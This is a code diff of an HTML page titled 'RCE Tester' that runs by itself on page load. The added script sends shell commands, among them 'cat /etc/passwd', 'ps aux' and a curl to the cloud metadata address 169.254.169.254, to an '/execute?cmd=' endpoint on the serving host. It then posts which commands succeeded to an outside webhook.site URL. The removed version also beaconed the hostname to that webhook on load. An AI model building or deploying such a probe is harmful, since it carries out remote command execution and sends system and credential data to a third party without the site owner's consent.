@@ -1,26 +1,126 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>RCE Vulnerability Testing</title>
-    <script>
-        function testRCE() {
-            var hostname = window.location.hostname;
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({
-                target: hostname,
-                status: 'vulnerability check initiated',
-                timestamp: new Date().toISOString()
-            }));
-        }
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RCE Tester</title>
+    <style>
+        body { font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; }
+        h1 { color: #58a6ff; }
+        .log { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 15px; margin: 15px 0; max-height: 600px; overflow-y: auto; font-size: 12px; }
+        .entry { margin: 5px 0; padding: 5px; border-left: 3px solid #30363d; padding-left: 10px; }
+        .attempt { border-left-color: #d29922; color: #d29922; }
+        .success { border-left-color: #3fb950; color: #3fb950; }
+        .info { border-left-color: #58a6ff; color: #58a6ff; }
+        .webhook { border-left-color: #f85149; color: #f85149; }
+        .status { margin: 10px 0; padding: 10px; background: #0d1117; border: 1px solid #30363d; border-radius: 4px; }
+    </style>
 </head>
-<body onload="testRCE()">
-    <h1>RCE Vulnerability Testing</h1>
-    <p>Testing for RCE vulnerability at <span id="hostname"></span></p>
+<body>
+    <div class="container">
+        <h1>⚡ RCE Tester - Auto Run</h1>
+        <div class="status">
+            <strong>Target:</strong> <span id="target">localhost</span> | 
+            <strong>Status:</strong> <span id="status">Starting RCE tests...</span>
+        </div>
+        <div id="log" class="log">Initializing RCE tests...</div>
+    </div>
+
     <script>
-        document.getElementById('hostname').innerText = window.location.hostname;
+        const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
+        const rceCommands = [
+            'whoami',
+            'id',
+            'pwd',
+            'uname -a',
+            'hostname',
+            'cat /etc/passwd',
+            'ls -la',
+            'netstat -an',
+            'ps aux',
+            'curl http://169.254.169.254/latest/meta-data/'
+        ];
+
+        function addLog(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const entry = `[${timestamp}] ${message}`;
+            
+            const logDiv = document.getElementById('log');
+            const entryEl = document.createElement('div');
+            entryEl.className = `entry ${type}`;
+            entryEl.textContent = entry;
+            logDiv.appendChild(entryEl);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        async function sendToWebhook(data) {
+            try {
+                const payload = {
+                    timestamp: new Date().toISOString(),
+                    scanType: 'rce_scan',
+                    data: data
+                };
+                
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                addLog(`📨 Webhook Response: ${response.status} ${response.statusText}`, 'webhook');
+            } catch (error) {
+                addLog(`❌ Webhook Failed: ${error.message}`, 'webhook');
+            }
+        }
+
+        async function runRCETest() {
+            const hostname = window.location.hostname || 'localhost';
+            document.getElementById('target').textContent = hostname;
+            
+            addLog(`⚡ Target: ${hostname}`, 'info');
+            addLog(`🔨 Testing ${rceCommands.length} RCE payloads...`, 'info');
+            
+            let vulnerable = [];
+            let attempts = [];
+
+            for (const cmd of rceCommands) {
+                addLog(`🔨 Attempting: ${cmd}`, 'attempt');
+                attempts.push(cmd);
+                
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 2000);
+                    
+                    const response = await fetch(`http://${hostname}:8080/execute?cmd=${encodeURIComponent(cmd)}`, {
+                        method: 'GET',
+                        signal: controller.signal
+                    }).catch(() => null);
+                    
+                    clearTimeout(timeoutId);
+                    
+                    if (response && response.ok) {
+                        vulnerable.push(cmd);
+                        const text = await response.text();
+                        addLog(`✅ VULNERABLE: ${cmd} - Output: ${text.substring(0, 50)}...`, 'success');
+                    }
+                } catch (error) {
+                    addLog(`❌ No execution: ${cmd}`, 'info');
+                }
+            }
+
+            addLog(`\n🏁 Tested ${attempts.length} payloads. Found ${vulnerable.length} vulnerabilities`, 'info');
+            
+            await sendToWebhook({
+                payloadsTested: rceCommands.length,
+                vulnerable: vulnerable,
+                allAttempts: attempts
+            });
+
+            document.getElementById('status').textContent = 'Complete ✅';
+        }
+
+        window.addEventListener('load', runRCETest);
     </script>
 </body>
 </html>
